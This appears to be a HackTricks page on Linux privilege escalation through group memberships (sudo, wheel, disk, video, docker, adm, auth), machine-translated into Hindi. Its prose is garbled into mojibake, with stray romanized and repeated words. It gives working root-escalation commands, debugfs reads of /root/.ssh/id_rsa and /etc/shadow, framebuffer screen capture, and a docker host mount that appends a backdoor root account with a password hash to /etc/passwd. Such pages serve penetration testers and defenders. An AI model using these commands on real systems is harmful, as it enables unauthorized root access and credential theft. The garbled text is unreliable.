# рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣ - рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЗрд╕реНрдХреЗрд▓реЗрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рд╕реБрдбреЛ/рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рдореВрд╣

### **PE - рд╡рд┐рдзрд┐ 1**

**рдХрднреА-рдХрднреА**, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ (рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)** рдЖрдк **/etc/sudoers** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЗрди рдкрдВрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рд╕реЗ рдХреБрдЫ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛ рд╕реВрдбреЛ рдпрд╛ рдПрдбрдорд┐рди рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ, рд╡рд╣ рд╕реВрдбреЛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдЫ рднреА рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ **рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```
sudo su
```
### PE - рд╡рд┐рдзрд┐ 2

рд╕рднреА suid рдмрд╛рдЗрдирд░реА рдЦреЛрдЬреЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдмрд╛рдЗрдирд░реА **Pkexec** рд╣реИ:
```bash
find / -perm -4000 2>/dev/null
```
рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдмрд╛рдЗрдирд░реА **pkexec рдПрдХ SUID рдмрд╛рдЗрдирд░реА рд╣реИ** рдФрд░ рдЖрдк **sudo** рдпрд╛ **admin** рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рддреЛ рдЖрдк `pkexec` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдЗрдирд░реА рдХреЛ sudo рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдо рддреМрд░ рдкрд░ рдпреЗ рд╕рдореВрд╣ **polkit рдиреАрддрд┐** рдХреЗ рдЕрдВрджрд░ рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рдиреАрддрд┐ рдЖрдо рддреМрд░ рдкрд░ рдпрд╣ рдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдХреМрди-рдХреМрди рд╕реЗ рд╕рдореВрд╣ `pkexec` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪреЗрдВ:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
рд╡рд╣рд╛рдБ рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕реЗ рд╕рдореВрд╣реЛрдВ рдХреЛ **pkexec** рдФрд░ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рдореЗрдВ рдХреБрдЫ рд▓рд┐рдирдХреНрд╕ рдбрд┐рд╕реНрдЯреНрд░реЛ рдореЗрдВ рд╕рдореВрд╣ **sudo** рдФрд░ **admin** рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

**рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
рдпрджрд┐ рдЖрдк **pkexec** рдХреЛ execute рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**рдпрд╣ рдЗрд╕рд▓рд┐рдП рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВ, рдмрд▓реНрдХрд┐ рдЗрд╕рд▓рд┐рдП рдХрд┐ рдЖрдк GUI рдХреЗ рдмрд┐рдирд╛ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реИрдВ**ред рдФрд░ рдЗрд╕ рдореБрджреНрджреЗ рдХрд╛ рдПрдХ рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдпрд╣рд╛рдБ рд╣реИ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)ред рдЖрдкрдХреЛ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ ssh рд╕рддреНрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## рд╡реНрд╣реАрд▓ рд╕рдореВрд╣

**рдХрднреА-рдХрднреА**, **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ **/etc/sudoers** рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдпрд╣ рдкрдВрдХреНрддрд┐ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```
%wheel	ALL=(ALL:ALL) ALL
```
Yah yah yah ki **koi bhi upayogakarta jo wheel samuh mein shamil hai, vah sudo ke roop mein kuch bhi chala sakta hai**.

Yadi aisa hai, to **root banne ke liye bas yah chalao**:
```
sudo su
```
## рд╢реИрдбреЛ рдЧреНрд░реБрдк

**рд╢реИрдбреЛ рдЧреНрд░реБрдк** рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **/etc/shadow** рдлрд╝рд╛рдЗрд▓ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## рдбрд┐рд╕реНрдХ рд╕рдореВрд╣

рдпрд╣ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд▓рдЧрднрдЧ **рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рдорд╛рди** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд╝рд╛рдЗрд▓реЗрдВ: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ debugfs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/tmp/asd1.txt` рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ `/tmp/asd2.txt` рдореЗрдВ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
рдлрд┐рд░ рднреА, рдЕрдЧрд░ рдЖрдк **рд░реВрдЯ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ (рдЬреИрд╕реЗ `/etc/shadow` рдпрд╛ `/etc/passwd`) рддреЛ рдЖрдкрдХреЛ "**рдЕрдиреБрдорддрд┐ рдирд╛рдордВрдЬреВрд░**" рддреНрд░реБрдЯрд┐ рдЖрдПрдЧреАред

## рд╡реАрдбрд┐рдпреЛ рд╕рдореВрд╣

`w` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХреМрди рд▓реЙрдЧ рдЗрди рд╣реИ** рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рджрд┐рдЦрд╛рдПрдЧрд╛:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **yossi рднреМрддрд┐рдХ рд░реВрдк рд╕реЗ** рдорд╢реАрди рдкрд░ рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ рд▓реЙрдЧ рдЗрди рд╣реИрдВред

**рд╡реАрдбрд┐рдпреЛ рд╕рдореВрд╣** рдХреЛ рд╕реНрдХреНрд░реАрди рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ рдЖрдк рд╕реНрдХреНрд░реАрди рдкрд░ рдореМрдЬреВрджрд╛ рдЫрд╡рд┐ рдХреЛ рд░реЙ рдбреЗрдЯрд╛ рдореЗрдВ рдкрдХрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рд╕реНрдХреНрд░реАрди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреА рд╣реИред рд╕реНрдХреНрд░реАрди рдбреЗрдЯрд╛ рдХреЛ `/dev/fb0` рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░реАрди рдХреА рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреЛ `/sys/class/graphics/fb0/virtual_size` рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**рдЦреЛрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП **рд░реЙ рдЗрдореЗрдЬ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЖрдк **GIMP** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **`screen.raw`** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ **рд░реЙ рдЗрдореЗрдЬ рдбреЗрдЯрд╛** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ:

![](<../../../.gitbook/assets/image (287) (1).png>)

рдлрд┐рд░ рдЪреМрдбрд╝рд╛рдИ рдФрд░ рдКрдЪрд╛рдИ рдХреЛ рд╕реНрдХреНрд░реАрди рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд╛рд▓реЗ рд╡рд╛рд▓реЗ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдЫрд╡рд┐ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рдЬрд╛рдВрдЪреЗрдВ (рдФрд░ рдЙрд╕реЗ рдЪреБрдиреЗрдВ рдЬреЛ рд╕реНрдХреНрд░реАрди рдХреЛ рдмреЗрд╣рддрд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ):

![](<../../../.gitbook/assets/image (288).png>)

## рд░реВрдЯ рд╕рдореВрд╣

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдХреЛ рдХреБрдЫ **рд╕реЗрд╡рд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реНрд╕ рдпрд╛ рдХреБрдЫ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА** рдлрд╝рд╛рдЗрд▓реНрд╕ рдпрд╛ **рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ** рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рд╡рд░реНрдЪрд╕реНрд╡ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ...

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд░реВрдЯ рд╕рджрд╕реНрдп рдХреМрди-рдХреМрди рд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## рдбреЙрдХрд░ рд╕рдореВрд╣

рдЖрдк **рдореЗрдЬрд╝рдмрд╛рди рдорд╢реАрди рдХреЗ рд░реВрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдЬрдм рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рддреБрд░рдВрдд рдЙрд╕ рд╡реЙрд▓реНрдпреВрдо рдореЗрдВ `chroot` рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЖрдкрдХреЛ рдорд╢реАрди рдкрд░ рд░реВрдЯ рджреЗрддрд╛ рд╣реИред
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
рдЕрдВрдд рдореЗрдВ, рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рдХрд┐рд╕реА рд╕реБрдЭрд╛рд╡ рд╕реЗ рд╕рдВрддреБрд╖реНрдЯ рдирд╣реАрдВ рд╣реИрдВ, рдпрд╛ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВ (рдбреЙрдХрд░ рдПрдкреАрдЖрдИ рдлрд╝рд╛рдпрд░рд╡реЙрд▓?) рддреЛ рдЖрдк рд╣рдореЗрд╢рд╛ **рдПрдХ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕рд╛ рдпрд╣рд╛рдБ рд╡рд┐рд╡рд░рдгрд┐рдд рд╣реИ:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рддреЛ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ рдХреИрд╕реЗ рдХреА рдЬрд╛рдП**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd рд╕рдореВрд╣

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm рд╕рдореВрд╣

рд╕рд╛рдорд╛рдиреНрдпрдд: **рд╕рдореВрд╣** рдХреЗ **рд╕рджрд╕реНрдп** рдХреЛ **`adm`** рд╕рдореВрд╣ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ _/var/log/_ рдореЗрдВ рд╕реНрдерд┐рдд рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ **рд▓реЙрдЧреНрд╕ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП**ред

## Auth рд╕рдореВрд╣

OpenBSD рдХреЗ рдЕрдВрджрд░, **auth** рд╕рдореВрд╣ рдЖрдо рддреМрд░ рдкрд░ рдлрд╝реЛрд▓реНрдбрд░ _**/etc/skey**_ рдФрд░ _**/var/db/yubikey**_ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рд╡реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред\
рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐** рдХреЗ рд▓рд┐рдП: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
